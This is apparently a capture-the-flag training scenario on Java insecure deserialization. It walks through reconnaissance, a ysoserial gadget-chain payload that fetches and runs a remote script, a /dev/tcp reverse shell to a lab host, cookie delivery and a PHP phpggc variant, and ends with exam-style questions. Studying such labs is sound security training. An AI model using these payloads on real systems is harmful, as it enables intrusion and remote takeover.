# Scenario 28 — Insecure deserialization (Java ysoserial) to RCE

**Difficulty:** 🔴 | **Time:** ~35 min | **Domains:** 13, 14
**Tools:** `ysoserial`, `curl`, [nmap](../../tools/nmap.md)

## Story
Target 10.10.10.28 runs a Java web app accepting a base64 serialized object in a cookie. Leverage a gadget chain to achieve RCE and read `/opt/flag.txt`.

## Step 1 — Identify the app stack
```bash
nmap -sV -p 8080 10.10.10.28
curl -I http://10.10.10.28:8080/
```
**Expected finding:** `X-Powered-By: Jetty` or `Server: Apache-Coyote`. `Set-Cookie: session=rO0AB...` (`rO0A` is base64 for `\xac\xed\x00\x05` = Java serialization magic).

## Step 2 — Test with a broken blob
```bash
curl -b "session=AAAA" http://10.10.10.28:8080/
```
**Expected finding:** Stack trace revealing `ObjectInputStream.readObject()` → classic vuln.

## Step 3 — Identify usable gadget
**What we're doing:** Check classpath from the stack trace for known-vulnerable libs (CommonsCollections 3.1, Spring, Hibernate, ROME).
```bash
# from stack trace:
org.apache.commons.collections.*  => use CommonsCollections1/5/6
```

## Step 4 — Generate payload with ysoserial
```bash
java -jar ysoserial.jar CommonsCollections5 \
  'bash -c {echo,Y3VybCAxMC4xMC4xMC45OS9zaHwgYmFzaA==}|{base64,-d}|{bash,-i}' \
  > payload.bin
base64 -w0 payload.bin > payload.b64
```
**Expected finding:** Serialized blob ready to fire.

## Step 5 — Start a listener and deliver
```bash
# terminal 1
nc -lvnp 4444
# terminal 2: host sh containing `bash -i >& /dev/tcp/10.10.10.99/4444 0>&1`
python3 -m http.server 80
# terminal 3
curl -b "session=$(cat payload.b64)" http://10.10.10.28:8080/
```
**Expected finding:** Reverse shell callback.

## Step 6 — Read the flag
```bash
cat /opt/flag.txt
```

## Step 7 — PHP variant (unserialize)
**What we're doing:** If target is PHP, look for a magic-method gadget (`__wakeup`, `__destruct`). Use phpggc:
```bash
phpggc Laravel/RCE6 system id > payload.txt
```

## Step 8 — Final answer
**Answer format:** flag string from `/opt/flag.txt`.

## Gotchas across this chain
- The `rO0A` prefix (base64 of 0xACED0005) is the Java serialization magic — always scan cookies/headers for it.
- Wrong gadget chain → `ClassNotFoundException`. Try CC1→CC5→CC6→Spring1→ROME systematically.
- URL-encode `+` and `=` in the base64 blob or they'll break.
- `ysoserial.net` is the Windows/.NET equivalent — watch for `AAEAAAD` base64 prefix = BinaryFormatter.

## Variant questions this scenario teaches
- "What Java library version is vulnerable on the target?"
- "Which ysoserial gadget chain works?"
- "What is the base64 magic of Java serialized data?" → `rO0AB`

